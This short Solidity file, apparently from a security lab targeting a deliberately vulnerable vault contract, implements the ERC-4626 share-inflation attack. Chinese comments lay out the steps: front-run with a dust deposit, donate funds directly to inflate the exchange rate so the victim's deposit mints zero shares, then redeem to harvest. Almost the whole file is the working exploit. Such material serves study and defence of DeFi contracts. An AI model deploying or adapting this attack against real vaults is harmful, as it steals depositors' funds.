// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {NaiveVault} from "../vulnerable/Vault4626.sol";

/// @notice 经典 inflation 攻击三部曲：
/// 1) 抢在第一个真实用户之前 deposit(1)，得到 1 share。
/// 2) 直接向 vault 转入 attackerCapital，把 totalAssets 拉到天文数字。
/// 3) 受害者 deposit(victimAmt) 时，minted = victimAmt * 1 / attackerCapital
///    若 victimAmt < attackerCapital 则被截断为 0，受害者存款被吞。
contract VaultInflator {
    function pwn(NaiveVault vault, IERC20 asset, uint256 dust, uint256 donation) external {
        asset.approve(address(vault), dust);
        vault.deposit(dust); // 拿到 1 share
        asset.transfer(address(vault), donation); // 直接捐赠膨胀汇率
    }

    function harvest(NaiveVault vault) external returns (uint256) {
        return vault.redeem(vault.shares(address(this)));
    }
}
